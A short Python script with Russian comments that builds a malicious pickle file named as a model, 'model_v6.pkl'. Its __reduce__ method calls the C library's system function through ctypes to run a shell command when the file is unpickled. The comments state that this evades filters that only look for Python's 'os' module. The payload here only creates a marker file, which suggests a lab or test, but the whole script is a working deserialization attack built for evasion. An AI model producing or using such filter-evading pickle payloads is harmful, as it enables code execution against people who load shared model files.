import pickle
import ctypes

class CtypesModel:
    def __reduce__(self):
        # Мы загружаем стандартную библиотеку C (libc)
        # И вызываем функцию system напрямую из неё.
        # Это обходит многие фильтры, которые ищут только Python-модуль 'os'.
        
        libc = ctypes.CDLL(None) 
        return (libc.system, (b'touch /app/CTYPES_WIN.txt',))

with open('model_v6.pkl', 'wb') as f:
    pickle.dump(CtypesModel(), f)

print("Модель-ниндзя 'model_v6.pkl' (ctypes) создана!")
